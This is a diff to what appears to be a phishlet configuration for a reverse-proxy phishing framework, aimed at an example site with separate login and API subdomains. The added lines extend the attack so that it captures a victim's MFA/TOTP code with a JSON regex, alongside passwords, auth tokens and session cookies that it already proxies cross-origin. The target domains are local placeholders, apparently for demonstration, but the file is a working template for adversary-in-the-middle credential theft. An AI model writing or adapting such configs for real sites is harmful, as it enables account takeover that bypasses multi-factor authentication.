@@ -4,9 +4,11 @@ version: "1"
 
 # Attacks the target-site example using two proxy hosts (examples/target-site/).
 # The login page is served by login.target.local, but the JS submits credentials
-# cross-origin to api.target.local/auth. Both subdomains must be proxied for the
-# attack to work. Demonstrates: multiple proxy_hosts, auto_filter, cross-origin
-# cookie sharing, auth_tokens type: body and type: header, credentials type: json.
+# cross-origin to api.target.local/auth (login) and api.target.local/auth/mfa
+# (MFA code). Both subdomains must be proxied for the attack to work.
+# Demonstrates: multiple proxy_hosts, auto_filter, cross-origin cookie sharing,
+# auth_tokens type: body and type: header, credentials type: json, custom
+# credential capture (MFA code).
 
 proxy_hosts:
   - phish_sub: login
@@ -55,6 +57,11 @@ credentials:
     key:    "password"
     search: '"password"\s*:\s*"([^"]+)"'
     type:   json
+  custom:
+    - name: totp_code
+      key:    "code"
+      search: '"code"\s*:\s*"([^"]+)"'
+      type:   json
 
 login:
   domain: api.target.local
